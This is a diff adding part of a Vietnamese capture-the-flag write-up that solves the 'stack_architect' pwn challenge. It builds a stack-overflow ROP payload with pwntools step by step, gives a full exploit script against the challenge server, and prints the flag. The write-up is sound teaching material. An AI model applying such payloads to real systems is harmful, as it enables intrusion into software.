@@ -120,4 +120,119 @@ Khi debug thì ta thấy được rằng `param_1` đã được gán bằng `0x
 
 Đồng thời, ta cũng thấy được rằng chương trình đã return được về `func2`.  
 
-![image](https://user-images.githubusercontent.com/44528004/147431410-d7f04924-d681-4068-b7d3-45ef41b7cc20.png)
+![image](https://user-images.githubusercontent.com/44528004/147431410-d7f04924-d681-4068-b7d3-45ef41b7cc20.png)  
+
+#### Xử lý xung đột vị trí ở `func2`
+Khi vào `func2`, ta thấy rằng thanh ghi `ebp` đang trỏ tới `0xffffd084` và trùng với vị trí `return address` của hàm `func1` lần 2. Đồng thời, phía trên địa chỉ này trên stack còn có `param_1` của hàm `func1` lần 2.  
+
+![image](https://user-images.githubusercontent.com/44528004/147431552-353b09f5-b53a-4383-a6b9-470f6232550f.png)  
+
+Để xử lý việc này, ta cần thực thi câu lệnh `pop` 2 lần để thanh ghi `esp` trỏ tới cuối `payload`. Ta sẽ dùng `ROPgadget` để tìm các `pop` và `ret` gadget.   
+
+![image](https://user-images.githubusercontent.com/44528004/147431723-01a16d57-9374-4a0f-88cf-449c58fca51a.png)
+
+Ta thấy rằng, ta có 1 gadget có 2 lệnh `pop` nên ta sẽ dùng gadget này.
+```
+0x08049422 : pop edi ; pop ebp ; ret
+```
+
+Vậy ta sẽ thay đổi 1 chút ở `payload` để hàm `func1` lần 2 sẽ nhảy đến gadget thay vì nhảy đến `func2`.  
+```python
+p = process('./stack_architect')
+e = ELF('./stack_architect')
+
+func1_addr = e.symbols['func1']
+func2_addr = e.symbols['func2']
+
+payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
+payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
+payload += p32(func1_addr)
+payload += p32(0x08049422)
+payload += p32(0x20010508)
+```
+
+Khi debug thì ta thấy rằng thanh ghi `esp` đã được *đẩy* xuống cuối `payload` và lúc này nó đang trỏ tới địa chỉ `0xffffd090` và sẽ cách buffer 0x6c bytes.  
+
+![image](https://user-images.githubusercontent.com/44528004/147432194-08943f5e-1e2a-4c0a-bbc0-c1de6feafc23.png)
+
+Cập nhất payload để chèn đỉa chỉ của `func2` vào stack để chương trình sẽ nhảy vào `func2` sau khi thực thi xong gadget.  
+```python
+e = ELF('./stack_architect')
+
+func1_addr = e.symbols['func1']
+func2_addr = e.symbols['func2']
+
+payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
+payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
+payload += p32(func1_addr)
+payload += p32(0x08049422)
+payload += p32(0x20010508)
+payload += b'A' * 4
+payload += p32(func2_addr)
+```
+
+Khi debug thì ta thấy chương trình đã return thành công về `func2`.  
+
+![image](https://user-images.githubusercontent.com/44528004/147432405-bb602b45-c161-4e94-9cdb-a1b131a6144f.png)  
+
+#### Chèn các giá trị vào buffer để thoả các điều kiện xét trong `func2`
+Ta debug và lập được bảng sau:
+| Đối tượng | Địa chỉ trên stack | Khoảng cách so với buffer (byte) |
+|---|---|---|
+| `ebp` của hàm `func2` | `0xffffd090` | - |
+| `local_8` | `ebp - 0x4 = 0xffffd08c` | 0x68 |
+| `return address` của hàm `func2` | `0xffffd094` | 0x70 |
+
+Từ đó, ta có payload sau:
+```python
+e = ELF('./stack_architect')
+
+func1_addr = e.symbols['func1']
+func2_addr = e.symbols['func2']
+win_addr = e.symbols['win']
+
+payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
+payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
+payload += p32(func1_addr)
+payload += p32(0x08049422)
+payload += p32(0x20010508)
+payload += p32(0x08052001)
+payload += p32(func2_addr)
+payload += p32(win_addr)
+```
+
+### Exploit remote
+Full script:
+```python
+from pwn import *
+
+p = remote('45.122.249.68', 10018)
+e = ELF('./stack_architect')
+
+func1_addr = e.symbols['func1']
+func2_addr = e.symbols['func2']
+win_addr = e.symbols['win']
+
+payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
+payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
+payload += p32(func1_addr)
+payload += p32(0x08049422)
+payload += p32(0x20010508)
+payload += p32(0x08052001)
+payload += p32(func2_addr)
+payload += p32(win_addr)
+
+with open('payload.in', 'wb') as f:
+    f.write(payload)
+
+p.sendline(payload)
+p.interactive()
+```
+
+Kết quả chạy local
+![image](https://user-images.githubusercontent.com/44528004/147432893-5bbe0f30-343e-4f31-a622-0277bcacdf7e.png)
+
+> Vì khi viết writeup này, remote đã đóng nên chỉ demo local.  
+
+Flag: `Wanna.One{neu_ban_chinh_phuc_duoc_chinh_minh_ban_co_the_chinh_phuc_duoc_the_gioi}`
+
